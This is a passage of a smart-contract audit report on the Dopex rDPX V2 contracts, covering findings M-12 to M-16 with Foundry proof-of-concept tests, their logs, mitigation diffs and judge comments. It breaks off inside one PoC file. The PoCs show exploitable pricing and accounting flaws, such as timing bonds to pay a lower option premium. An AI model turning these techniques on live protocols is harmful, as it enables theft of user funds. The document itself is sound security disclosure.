        vm.stopPrank();
        console.log("weth paid without decaying bond");
        console.log(wethRequired);
        console.log("delegatee received amount without decaying bond");
        console.log(delegateAmounts[0]);

        vm.startPrank(alice);
        rdpx.approve(address(rdpxV2Core), type(uint256).max);
        // with decaying bond
        (uint256 rdpxRequired2, uint256 wethRequired2) = rdpxV2Core
            .calculateBondCost(1 * 1e18, 1);
        (uint256 userAmount2, uint256[] memory delegateAmounts2) = rdpxV2Core
            .bondWithDelegate(alice, _amounts, _delegateIds, 1);
        vm.stopPrank();

        console.log("weth paid with decaying bond");
        console.log(wethRequired2);
        console.log("delegatee received amount with decaying bond");
        console.log(delegateAmounts2[0]);
    }
```

</details>

Run the test :

    forge test --match-contract Unit --match-test testBondWithDelegateCompare -vvv

Test Output :

    Logs:
      weth paid without decaying bond
      806250000000000000
      delegatee received amount without decaying bond
      197562425683709869

      weth paid with decaying bond
      812500000000000000
      delegatee received amount with decaying bond
      197058823529411765

It can be observed delegatee paid weth more with decaying bond and receive less bond share.

### Recommended Mitigation Steps

Consider to restrict `bondWithDelegate` for only non-decaying bonds. Or also add discount but apply only to the weth part if called from `bondWithDelegate`.

**[Alex the Entreprenerd (Judge) commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/780#issuecomment-1772393892):**
 > Incur Loss == Mispriced

 Making primary because this warden sent the POC before any request.

***

## [[M-12] User can avoid paying high premium price by correctly timing his bond call](https://github.com/code-423n4/2023-08-dopex-findings/issues/761)
*Submitted by [said](https://github.com/code-423n4/2023-08-dopex-findings/issues/761), also found by [qpzm](https://github.com/code-423n4/2023-08-dopex-findings/issues/2004), \_\_141345\_\_ ([1](https://github.com/code-423n4/2023-08-dopex-findings/issues/1969), [2](https://github.com/code-423n4/2023-08-dopex-findings/issues/1791)), [Tendency](https://github.com/code-423n4/2023-08-dopex-findings/issues/1832), [nirlin](https://github.com/code-423n4/2023-08-dopex-findings/issues/1389), [carrotsmuggler](https://github.com/code-423n4/2023-08-dopex-findings/issues/1016), [wallstreetvilkas](https://github.com/code-423n4/2023-08-dopex-findings/issues/344), [Nyx](https://github.com/code-423n4/2023-08-dopex-findings/issues/232), [0xWaitress](https://github.com/code-423n4/2023-08-dopex-findings/issues/166), [RED-LOTUS-REACH](https://github.com/code-423n4/2023-08-dopex-findings/issues/1833), and [peakbolt](https://github.com/code-423n4/2023-08-dopex-findings/issues/735)*

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L481-L483> 

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L283-L286>

When user execute bond operations and `putOptionsRequired` is `true`, the premium that they will pay is depend on time when the bond operations will be executed. This will cause the premium paid by user will be less despite bond the same amount at the same price if they time it correctly.

### Proof of Concept

When user trigger `bond` or `bondWithDelegate`, it will call `calculateBondCost` to calculate `rdpxRequired` and `wethRequired`.

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L904-L907>

<details>

```solidity
  function bond(
    uint256 _amount,
    uint256 rdpxBondId,
    address _to
  ) public returns (uint256 receiptTokenAmount) {
    _whenNotPaused();
    // Validate amount
    _validate(_amount > 0, 4);

    // Compute the bond cost
>>> (uint256 rdpxRequired, uint256 wethRequired) = calculateBondCost(
      _amount,
      rdpxBondId
    );

    IERC20WithBurn(weth).safeTransferFrom(
      msg.sender,
      address(this),
      wethRequired
    );

    // update weth reserve
    reserveAsset[reservesIndex["WETH"]].tokenBalance += wethRequired;

    // purchase options
    uint256 premium;
    if (putOptionsRequired) {
      premium = _purchaseOptions(rdpxRequired);
    }

    _transfer(rdpxRequired, wethRequired - premium, _amount, rdpxBondId);

    // Stake the ETH in the ReceiptToken contract
    receiptTokenAmount = _stake(_to, _amount);

    // reLP
    if (isReLPActive) IReLP(addresses.reLPContract).reLP(_amount);

    emit LogBond(rdpxRequired, wethRequired, receiptTokenAmount);
  }
```
</details>

If `putOptionsRequired` is `true`, `calculateBondCost` will calculate the `premium` users need to pay and add it to `wethRequired` :

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1192-L1198>

<details>

```solidity
  function calculateBondCost(
    uint256 _amount,
    uint256 _rdpxBondId
  ) public view returns (uint256 rdpxRequired, uint256 wethRequired) {
    uint256 rdpxPrice = getRdpxPrice();

    if (_rdpxBondId == 0) {
      uint256 bondDiscount = (bondDiscountFactor *
        Math.sqrt(IRdpxReserve(addresses.rdpxReserve).rdpxReserve()) *
        1e2) / (Math.sqrt(1e18)); // 1e8 precision

      _validate(bondDiscount < 100e8, 14);

      rdpxRequired =
        ((RDPX_RATIO_PERCENTAGE - (bondDiscount / 2)) *
          _amount *
          DEFAULT_PRECISION) /
        (DEFAULT_PRECISION * rdpxPrice * 1e2);

      wethRequired =
        ((ETH_RATIO_PERCENTAGE - (bondDiscount / 2)) * _amount) /
        (DEFAULT_PRECISION * 1e2);
    } else {
      // if rdpx decaying bonds are being used there is no discount
      rdpxRequired =
        (RDPX_RATIO_PERCENTAGE * _amount * DEFAULT_PRECISION) /
        (DEFAULT_PRECISION * rdpxPrice * 1e2);

      wethRequired =
        (ETH_RATIO_PERCENTAGE * _amount) /
        (DEFAULT_PRECISION * 1e2);
    }

    uint256 strike = IPerpetualAtlanticVault(addresses.perpetualAtlanticVault)
      .roundUp(rdpxPrice - (rdpxPrice / 4)); // 25% below the current price

>>> uint256 timeToExpiry = IPerpetualAtlanticVault(
      addresses.perpetualAtlanticVault
    ).nextFundingPaymentTimestamp() - block.timestamp;
    if (putOptionsRequired) {
>>>   wethRequired += IPerpetualAtlanticVault(addresses.perpetualAtlanticVault)
        .calculatePremium(strike, rdpxRequired, timeToExpiry, 0);
    }
  }
```
</details>

It can be observed that the provided `timeToExpiry` is depend on `nextFundingPaymentTimestamp` and current `block.timestamp`.

This has potential leak value issue, since with providing the same amount at the same price (assume the rdpx price will not be that volatile), the user paid less premium by timing the bond near to `nextFundingPaymentTimestamp`.

Foundry PoC :

The goal of this PoC is we try to compare the option price we get, using `OptionPricingSimple`, providing the same amount and price, with different time. `OptionPricingSimple` configured with 0.05% minimum price, funding duration 7 days and current `rdpxPriceInEth` is `2e7`.

Compared time 7 days, 6 days, and 1 day before next funding payment.

Add this test to `Unit` contract inside `/tests/rdpxV2-core/Unit.t.sol`, also add `import "forge-std/console.sol";` and `import {OptionPricingSimple} from "contracts/libraries/OptionPricingSimple.sol";` in the contract:

<details>

```solidity
    function testOptionPricingTiming() public {
        OptionPricingSimple optionPricingSimple;
        // 5e6
        optionPricingSimple = new OptionPricingSimple(100, 5e6);

        (uint256 rdpxRequired, uint256 wethRequired) = rdpxV2Core
            .calculateBondCost(1 * 1e18, 0);

        uint256 currentPrice = vault.getUnderlyingPrice(); // price
        uint256 strike = vault.roundUp(currentPrice - (currentPrice / 4)); // 25% below the current price
        console.log("What is the current price");
        console.log(currentPrice);
        console.log("What is the strike");
        console.log(strike);

        // 7 days before next funding payment
        uint256 timeToExpiry = vault.nextFundingPaymentTimestamp() -
            block.timestamp;
        console.log("What is time to expiry initial :");
        console.log(timeToExpiry);
        uint256 optionPrice = optionPricingSimple.getOptionPrice(
            strike,
            currentPrice,
            100,
            timeToExpiry
        );
        console.log("What is option pricing initial :");
        console.log(optionPrice);

        // 1 day afters
        vm.warp(block.timestamp + 1 days);
        uint256 timeToExpiryAfter1Day = vault.nextFundingPaymentTimestamp() -
            block.timestamp;
        console.log("What is time to expiry after 1 day :");
        console.log(timeToExpiryAfter1Day);
        optionPrice = optionPricingSimple.getOptionPrice(
            strike,
            currentPrice,
            100,
            timeToExpiryAfter1Day
        );
        console.log("What is option pricing after 1 day :");
        console.log(optionPrice);

        // after 6 days
        vm.warp(block.timestamp + 5 days);
        uint256 timeToExpiryAfter6Day = vault.nextFundingPaymentTimestamp() -
            block.timestamp;
        console.log("What is time to expiry after 6 day :");
        console.log(timeToExpiryAfter6Day);

        optionPrice = optionPricingSimple.getOptionPrice(
            strike,
            currentPrice,
            100,
            timeToExpiryAfter6Day
        );
        console.log("What is option pricing after 6 day :");
        console.log(optionPrice);
    }
```
</details>

Run the PoC :

    forge test --match-contract Unit --match-test testOptionPricingTiming -vvv

Log Output :

    Logs:
      What is the current price
      20000000
      What is the strike
      15000000

      What is time to expiry initial :
      604800
      What is option pricing initial :
      16481

      What is time to expiry after 1 day :
      518400
      What is option pricing after 1 day :
      10000

      What is time to expiry after 6 day :
      86400
      What is option pricing after 6 day :
      10000

It can be observed that users will pay minimum price (0.05%) even only after 1 day updating funding time pointer!

### Recommended Mitigation Steps

To avoid this, fix the provided Black-Scholes option price observation time to funding epoch duration windows :

<details>

```diff
  function calculateBondCost(
    uint256 _amount,
    uint256 _rdpxBondId
  ) public view returns (uint256 rdpxRequired, uint256 wethRequired) {
    uint256 rdpxPrice = getRdpxPrice();

    if (_rdpxBondId == 0) {
      uint256 bondDiscount = (bondDiscountFactor *
        Math.sqrt(IRdpxReserve(addresses.rdpxReserve).rdpxReserve()) *
        1e2) / (Math.sqrt(1e18)); // 1e8 precision

      _validate(bondDiscount < 100e8, 14);

      rdpxRequired =
        ((RDPX_RATIO_PERCENTAGE - (bondDiscount / 2)) *
          _amount *
          DEFAULT_PRECISION) /
        (DEFAULT_PRECISION * rdpxPrice * 1e2);

      wethRequired =
        ((ETH_RATIO_PERCENTAGE - (bondDiscount / 2)) * _amount) /
        (DEFAULT_PRECISION * 1e2);
    } else {
      // if rdpx decaying bonds are being used there is no discount
      rdpxRequired =
        (RDPX_RATIO_PERCENTAGE * _amount * DEFAULT_PRECISION) /
        (DEFAULT_PRECISION * rdpxPrice * 1e2);

      wethRequired =
        (ETH_RATIO_PERCENTAGE * _amount) /
        (DEFAULT_PRECISION * 1e2);
    }

    uint256 strike = IPerpetualAtlanticVault(addresses.perpetualAtlanticVault)
      .roundUp(rdpxPrice - (rdpxPrice / 4)); // 25% below the current price

-    uint256 timeToExpiry = IPerpetualAtlanticVault(
-      addresses.perpetualAtlanticVault
-    ).nextFundingPaymentTimestamp() - block.timestamp;
+    uint256 timeToExpiry = IPerpetualAtlanticVault(
+      addresses.perpetualAtlanticVault
+    ).nextFundingPaymentTimestamp() -
+      IPerpetualAtlanticVault(addresses.perpetualAtlanticVault).fundingDuration();
    if (putOptionsRequired) {
      wethRequired += IPerpetualAtlanticVault(addresses.perpetualAtlanticVault)
        .calculatePremium(strike, rdpxRequired, timeToExpiry, 0);
    }
  }
```
</details>

Also update the time expiry when purchase the options

<details>

```diff
  function purchase(
    uint256 amount,
    address to
  )
    external
    nonReentrant
    onlyRole(RDPXV2CORE_ROLE)
    returns (uint256 premium, uint256 tokenId)
  {
    _whenNotPaused();
    _validate(amount > 0, 2);

    updateFunding();

    uint256 currentPrice = getUnderlyingPrice(); // price of underlying wrt collateralToken
    uint256 strike = roundUp(currentPrice - (currentPrice / 4)); // 25% below the current price
    IPerpetualAtlanticVaultLP perpetualAtlanticVaultLp = IPerpetualAtlanticVaultLP(
        addresses.perpetualAtlanticVaultLP
      );

    // Check if vault has enough collateral to write the options
    uint256 requiredCollateral = (amount * strike) / 1e8;

    _validate(
      requiredCollateral <= perpetualAtlanticVaultLp.totalAvailableCollateral(),
      3
    );

-    uint256 timeToExpiry = nextFundingPaymentTimestamp() - block.timestamp;
+    uint256 timeToExpiry = nextFundingPaymentTimestamp() - fundingDuration
    // Get total premium for all options being purchased
    premium = calculatePremium(strike, amount, timeToExpiry, 0);

    // Transfer premium from msg.sender to PerpetualAtlantics vault
    collateralToken.safeTransferFrom(msg.sender, address(this), premium);

    perpetualAtlanticVaultLp.lockCollateral(requiredCollateral);
    _updateFundingRate(premium);

    // Mint the option tokens
    tokenId = _mintOptionToken();
    optionPositions[tokenId] = OptionPosition({
      strike: strike,
      amount: amount,
      positionId: tokenId
    });

    totalActiveOptions += amount;
    fundingPaymentsAccountedFor[latestFundingPaymentPointer] += amount;
    optionsPerStrike[strike] += amount;

    // record the number of options funding has been accounted for the epoch and strike
    fundingPaymentsAccountedForPerStrike[latestFundingPaymentPointer][
      strike
    ] += amount;

    emit Purchase(strike, amount, premium, to, msg.sender);
  }
```
</details>

**[witherblock (Dopex) confirmed](https://github.com/code-423n4/2023-08-dopex-findings/issues/761#issuecomment-1734070352)**

***

## [[M-13] Cannot withdraw RDPX if WETH withdrawn is zero](https://github.com/code-423n4/2023-08-dopex-findings/issues/750)
*Submitted by [gjaldon](https://github.com/code-423n4/2023-08-dopex-findings/issues/750), also found by [Toshii](https://github.com/code-423n4/2023-08-dopex-findings/issues/2088), [QiuhaoLi](https://github.com/code-423n4/2023-08-dopex-findings/issues/1939), [Evo](https://github.com/code-423n4/2023-08-dopex-findings/issues/1652), [Yanchuan](https://github.com/code-423n4/2023-08-dopex-findings/issues/1102), [peakbolt](https://github.com/code-423n4/2023-08-dopex-findings/issues/741), [tapir](https://github.com/code-423n4/2023-08-dopex-findings/issues/548), [HChang26](https://github.com/code-423n4/2023-08-dopex-findings/issues/492), and [rvierdiiev](https://github.com/code-423n4/2023-08-dopex-findings/issues/256)*

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L162> 

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L262-L266> 

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L218-L229> 

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L346-L357>

`VaultLP` does not allow redemption of shares when it leads to 0 WETH being withdrawn. `VaultLP` can end up in a state where it has a small amount of WETH and most of its reserves is in RDPX instead. This can happen when most of its WETH is locked as collateral for Put Options and all these Put Options were exercised/settled due to RDPX price dropping.

In this state, many depositors in the LP who have lost their WETH will not even be able to redeem their shares for the RDPX compensation.

### Proof of Concept

The following steps will reproduce the issue:

1.  Depositors [`deposit()`](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L118-L135) `100_000e18` WETH to `VaultLP`.
2.  `RdpxV2Core` purchased so many options (since so many users were bonding) that it locked up all `100_000e18` WETH collateral as backing for all the options.
3.  RDPX price dropped so much that all the Put Options had to be [`settled()`](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L347-L357) to bring dpxETH peg back up. This replaces all the `100_000e18` WETH with RDPX.
4.  Since total WETH collateral of `VaultLP` is now 0, none of the depositors can [`redeem()`](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L145-L175) their shares due to this check:

```solidity
require(assets != 0, "ZERO_ASSETS");
```

The above check will always fail since the computation for `assets` looks like:

```solidity
shares.mulDivDown(totalCollateral(), supply)
```

`totalCollateral()` will return 0 because there is no WETH collateral left in the `VaultLP`. So the above computation will be `shares * 0 / supply` which will always equal 0. So even if the depositor has `1_000e18` shares and a lot of RDPX they are supposed to be able to withdraw, they will not be able to. In effect, they would lose 100% of their WETH deposited into `VaultLP` and get zero RDXP in compensation.

### Recommended Mitigation Steps

The validation in [`redeem()`](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L162) can be replaced with the following:

```solidity
require((assets + rdpxAmount) != 0, "ZERO_ASSETS");
```

That way, as long as there is any amount of RDPX or WETH they can withdraw, they will be able to do so.

**[psytama (Dopex) confirmed and commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/750#issuecomment-1733740622):**
 > Modify `require` in the `redeem` function.

**[Alex the Entreprenerd (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/750#issuecomment-1753147155):**
 > The finding is valid in that 0 weth will revert.
> 
> But the scenario seems to be extreme, thinking Med due to reliance on external condition.


***

## [[M-14] No slippage protection for bonders](https://github.com/code-423n4/2023-08-dopex-findings/issues/598)
*Submitted by [dirk\_y](https://github.com/code-423n4/2023-08-dopex-findings/issues/598), also found by [ladboy233](https://github.com/code-423n4/2023-08-dopex-findings/issues/2033), [Evo](https://github.com/code-423n4/2023-08-dopex-findings/issues/1647), [Brenzee](https://github.com/code-423n4/2023-08-dopex-findings/issues/1375), and [T1MOH](https://github.com/code-423n4/2023-08-dopex-findings/issues/790)*

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L894-L913> 

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1156-L1165>

When a user calls `bond` or `bondWithDelegate` they specify the amount of DpxEth they want to bond for. As part of this call the cost of the bond (in WETH and rDPX) is calculated. The discount provided for a bond depends on the bond discount factor and the amount of rDPX in the reserve. The bond discount factor should remain relatively static since it is modified only by the admin, but the amount of rDPX in the reserve is constantly fluctuating.

This is therefore a problem, because the discount at the time where the users tries to bond might be different from the actual discount when the transaction is included in a block since the rDPX in the reserve may have changed. Therefore the bonder will end up paying more WETH and/or rDPX for the given amount of bonds than expected.

Since the bonders are still receiving a discount I have lowered the severity of this report from "high" to "medium", however I still consider this a bug because a bonder might expect/require a certain discount in order to make their whole trading strategy profitable.

### Proof of Concept

For the sake of this report, let's focus on the normal `bond` path:

      function bond(
        uint256 _amount,
        uint256 rdpxBondId,
        address _to
      ) public returns (uint256 receiptTokenAmount) {
        _whenNotPaused();
        // Validate amount
        _validate(_amount > 0, 4);

        // Compute the bond cost
        (uint256 rdpxRequired, uint256 wethRequired) = calculateBondCost(
          _amount,
          rdpxBondId
        );

        IERC20WithBurn(weth).safeTransferFrom(
          msg.sender,
          address(this),
          wethRequired
        );

When calling `bond`, the amount of bond to mint is specified, and the cost of those bonds is then calculated with a call to `calculateBondCost` and the WETH transferred from the user (the rDPX is also transferred later). As you can see, there is no way for the user to specify the maximum amount of rDPX or WETH that they want to spend to purchase the bonds.

Now, let's have a look at the first part of the discount calculation logic:

      function calculateBondCost(
        uint256 _amount,
        uint256 _rdpxBondId
      ) public view returns (uint256 rdpxRequired, uint256 wethRequired) {
        uint256 rdpxPrice = getRdpxPrice();

        if (_rdpxBondId == 0) {
          uint256 bondDiscount = (bondDiscountFactor *
            Math.sqrt(IRdpxReserve(addresses.rdpxReserve).rdpxReserve()) *
            1e2) / (Math.sqrt(1e18)); // 1e8 precision

As you can see, `bondDiscount` varies with `bondDiscountFactor` and the amount of rDPX in the reserve. Since the user has no control over the rDPX in the reserve, it is possible that this can change from block to block, thereby changing the discount and therefore the WETH & rDPX spent by the user.

This is now a classic "lack of slippage protection" bug that should be resolved as discussed below.

### Recommended Mitigation Steps

The `bond` and `bondWithDelegate` should include an additional slippage argument to cap the amount of either WETH or rDPX that they want to spend. Since the ratio of rDPX to WETH is fixed you technically need only a `maxAmount` for one of these; I would suggest `maxRDPX`.

**[witherblock (Dopex) disagreed with severity and commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/598#issuecomment-1734117439):**
 > Avoided via adding slippage protection via token approvals, demoting to QA.

**[Alex the Entreprenerd (Judge) commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/598#issuecomment-1772398594):**
 > While the mitigation suggested by the Sponsor is technically correct, I don't believe we can reasonably expect end users to use their allowance as a way to express pricing. This is due to the fact that such an operation would not be atomical.
> 
> With the information I have available, I believe it is reasonable to say that the execution price is not guaranteed, and since there seems to be a reasonable expectation that no router would be used, the code can cause a leak of value to the caller.
> 
> Leading me to believe that Medium Severity is most appropriate.

**[psytama (Dopex) commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/598#issuecomment-1777718475):**
 > As mentioned before this can be mitigated via approval checks and will be added to the UI to allow users to know the max cost they would pay for a bond.

***

## [[M-15] `sync` function in `RdpxV2Core.sol` should be called in multiple scenarios to account for the balance changes that occurs](https://github.com/code-423n4/2023-08-dopex-findings/issues/269)
*Submitted by [Vagner](https://github.com/code-423n4/2023-08-dopex-findings/issues/269), also found by [oakcobalt](https://github.com/code-423n4/2023-08-dopex-findings/issues/2231), [T1MOH](https://github.com/code-423n4/2023-08-dopex-findings/issues/2227), [Aymen0909](https://github.com/code-423n4/2023-08-dopex-findings/issues/2226), [savi0ur](https://github.com/code-423n4/2023-08-dopex-findings/issues/2038), [codegpt](https://github.com/code-423n4/2023-08-dopex-findings/issues/2025), [KmanOfficial](https://github.com/code-423n4/2023-08-dopex-findings/issues/2013), [alexzoid](https://github.com/code-423n4/2023-08-dopex-findings/issues/1974), [wintermute](https://github.com/code-423n4/2023-08-dopex-findings/issues/1915), [nemveer](https://github.com/code-423n4/2023-08-dopex-findings/issues/1867), [bin2chen](https://github.com/code-423n4/2023-08-dopex-findings/issues/1775), [Evo](https://github.com/code-423n4/2023-08-dopex-findings/issues/1676), ak1 ([1](https://github.com/code-423n4/2023-08-dopex-findings/issues/1510), [2](https://github.com/code-423n4/2023-08-dopex-findings/issues/1459)), [0Kage](https://github.com/code-423n4/2023-08-dopex-findings/issues/1365), [pep7siup](https://github.com/code-423n4/2023-08-dopex-findings/issues/1183), [MohammedRizwan](https://github.com/code-423n4/2023-08-dopex-findings/issues/1155), [qbs](https://github.com/code-423n4/2023-08-dopex-findings/issues/966), [hals](https://github.com/code-423n4/2023-08-dopex-findings/issues/952), [said](https://github.com/code-423n4/2023-08-dopex-findings/issues/937), ladboy233 ([1](https://github.com/code-423n4/2023-08-dopex-findings/issues/934), [2](https://github.com/code-423n4/2023-08-dopex-findings/issues/931)), [Viktor\_Cortess](https://github.com/code-423n4/2023-08-dopex-findings/issues/833), [peakbolt](https://github.com/code-423n4/2023-08-dopex-findings/issues/798), 0xnev ([1](https://github.com/code-423n4/2023-08-dopex-findings/issues/634), [2](https://github.com/code-423n4/2023-08-dopex-findings/issues/631)), zaevlad ([1](https://github.com/code-423n4/2023-08-dopex-findings/issues/545), [2](https://github.com/code-423n4/2023-08-dopex-findings/issues/526)), ABAIKUNANBAEV ([1](https://github.com/code-423n4/2023-08-dopex-findings/issues/538), [2](https://github.com/code-423n4/2023-08-dopex-findings/issues/513)), [mrudenko](https://github.com/code-423n4/2023-08-dopex-findings/issues/440), [zzebra83](https://github.com/code-423n4/2023-08-dopex-findings/issues/418), [0xCiphky](https://github.com/code-423n4/2023-08-dopex-findings/issues/384), [Yanchuan](https://github.com/code-423n4/2023-08-dopex-findings/issues/250), and [tapir](https://github.com/code-423n4/2023-08-dopex-findings/issues/447)*

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV2LiquidityAmo.sol#L160-L178> 

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV3LiquidityAmo.sol#L118-L133>

The function `sync` is used in `RdpxV2Core.sol` to synchronize the balances of the reserve assets stored in the contract, but it is not called in all of the situations where swaps/providing/removing liquidity is made.

### Proof of Concept

As you can see `sync` is called in `UniV3LiquidityAmo.sol` after `_sendTokensToRdpxV2Core` is called to occur for all of the balances change after modifying the liquidity in UniswapV3 <br><https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV3LiquidityAmo.sol#L361><br>
But it is not called functions like `collectFees` where funds are directly transferred to `RdpxV2Core.sol` <br><https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV3LiquidityAmo.sol#L118-L133><br>
Or in `_sendTokensToRdpxV2Core` in the `UniV2LiquidityAmo.sol` which transfers tokens to `RdpxV2Core` <br><https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV2LiquidityAmo.sol#L157-L178><br>
Because of that wrong assumptions can be taken in cases of `lowerDepeg` or `upperDepeg`, or any other functions that uses the balances of assets stored, if `sync` was not called before.

### Recommended Mitigation Steps

Since you already call `sync` in `_sendTokensToRdpxV2Core` from `UniV3LiquidityAmo.sol`, call it in `collectFees` and `_sendTokensToRdpxV2Core` from `UniV2LiquidityAmo.sol` also to accounts for any balance changes, which will protect the protocol against errors.

**[bytes032 (Lookout) commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/269#issuecomment-1712408116):**
 > * [This is related to Uni V2, in the implementation for V3 it is called.](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV3LiquidityAmo.sol#L361)
> * This will cause less than expected backing reserves, which can lead to underflow when performing various other actions such as when providing funding for APP options (provideFunding()), settling options (settle()).
> * The [function getReserveTokenInfo](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1135) is no longer a reliable source for external integration to retrieve the token balance state.
> 
> Potentially impacts the following functions:
> - [_purchaseOptions](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L486)
> - [_stake](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L570)
> - [settle](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L780)
> - [provideFunding](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L803)
> - [lowerDepeg](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1106)
> 
> Edit: It’s actually not called in [collectFee’s](https://github.com/code-423n4/2023-08-dopex-findings/issues/934) as well. I’m duplicating all of these under a single primary issue, because #269 mentions both.

**[witherblock (Dopex) confirmed](https://github.com/code-423n4/2023-08-dopex-findings/issues/269#issuecomment-1734174462)**

**[Alex the Entreprenerd (Judge) commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/269#issuecomment-1759127851):**
 > Seems like an opportunity for a higher exploit was missed by stopping at the broken sync.

***

## [[M-16] Inaccurate swap amount calculation in ReLP leads to stuck tokens and lost liquidity](https://github.com/code-423n4/2023-08-dopex-findings/issues/153)
*Submitted by [degensec](https://github.com/code-423n4/2023-08-dopex-findings/issues/153), also found by [KmanOfficial](https://github.com/code-423n4/2023-08-dopex-findings/issues/2036), [QiuhaoLi](https://github.com/code-423n4/2023-08-dopex-findings/issues/1860), [jasonxiale](https://github.com/code-423n4/2023-08-dopex-findings/issues/1582), [bart1e](https://github.com/code-423n4/2023-08-dopex-findings/issues/1470), [nirlin](https://github.com/code-423n4/2023-08-dopex-findings/issues/1418), [pep7siup](https://github.com/code-423n4/2023-08-dopex-findings/issues/1347), [qpzm](https://github.com/code-423n4/2023-08-dopex-findings/issues/1316), [ubermensch](https://github.com/code-423n4/2023-08-dopex-findings/issues/1286), [peanuts](https://github.com/code-423n4/2023-08-dopex-findings/issues/1279), [tapir](https://github.com/code-423n4/2023-08-dopex-findings/issues/1143), [kutugu](https://github.com/code-423n4/2023-08-dopex-findings/issues/1140), [mert\_eren](https://github.com/code-423n4/2023-08-dopex-findings/issues/1101), [WoolCentaur](https://github.com/code-423n4/2023-08-dopex-findings/issues/793), [peakbolt](https://github.com/code-423n4/2023-08-dopex-findings/issues/787), [ayden](https://github.com/code-423n4/2023-08-dopex-findings/issues/772), [0xnev](https://github.com/code-423n4/2023-08-dopex-findings/issues/627), [T1MOH](https://github.com/code-423n4/2023-08-dopex-findings/issues/536), [HChang26](https://github.com/code-423n4/2023-08-dopex-findings/issues/300), [Yanchuan](https://github.com/code-423n4/2023-08-dopex-findings/issues/254), [0x3b](https://github.com/code-423n4/2023-08-dopex-findings/issues/70), and [wintermute](https://github.com/code-423n4/2023-08-dopex-findings/issues/1993)*

`ReLPContract` contains logic that removes WETH-RDPX liquidity from Uniswap V2, swaps some amount WETH to RDPX and re-adds the liquidity.

The calculation logic for the amount of tokens to swap is unreliable and sometimes reverts or leaves dust WETH in the reLP contract. WETH cannot be recovered unless another reLP operation is triggered. However, since reLP-ing is accessible to all users in the bonding logic in `RdpxV2Core`, the contract may be **griefed on an ongoing basis, intentional or not.**

The presence of excess WETH also means that the total value of the LP decreases abnormally after each reLP operation.

### Proof of Concept

The following Foundry test demonstrates the vulnerability.

*   Paste the code in a new file `PoC.t.sol` under `tests/`
*   Run the test with `forge test --match-test test_poc_relp_dust -vvv`

<details>

```

    // File: PoC.t.sol
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity 0.8.19;

    import "forge-std/Test.sol";
    import "forge-std/console.sol";

    import { Math } from "@openzeppelin/contracts/utils/math/Math.sol";
    import {IERC20WithBurn} from "contracts/interfaces/IERC20WithBurn.sol";
    import {MockToken} from "contracts/mocks/MockToken.sol";
    import {MockRdpxEthPriceOracle} from "contracts/mocks/MockRdpxEthPriceOracle.sol";
    import {ReLPContract} from "contracts/reLP/ReLPContract.sol";
    import {RdpxReserve} from "contracts/reserve/RdpxReserve.sol";
    import {IUniswapV2Factory} from "contracts/uniswap_V2/IUniswapV2Factory.sol";
    import {IUniswapV2Router} from "contracts/uniswap_V2/IUniswapV2Router.sol";
    import {IUniswapV2Pair} from "contracts/uniswap_V2/IUniswapV2Pair.sol";

    contract MockUniV2Amo {
        function sync() external {}

        function approve(address token, address to, uint256 amount) external {
            IERC20WithBurn(token).approve(to, amount);
        }
    }

    contract MockRdpxV2Core {
        function sync() external {}
    }

    contract PoC is Test {
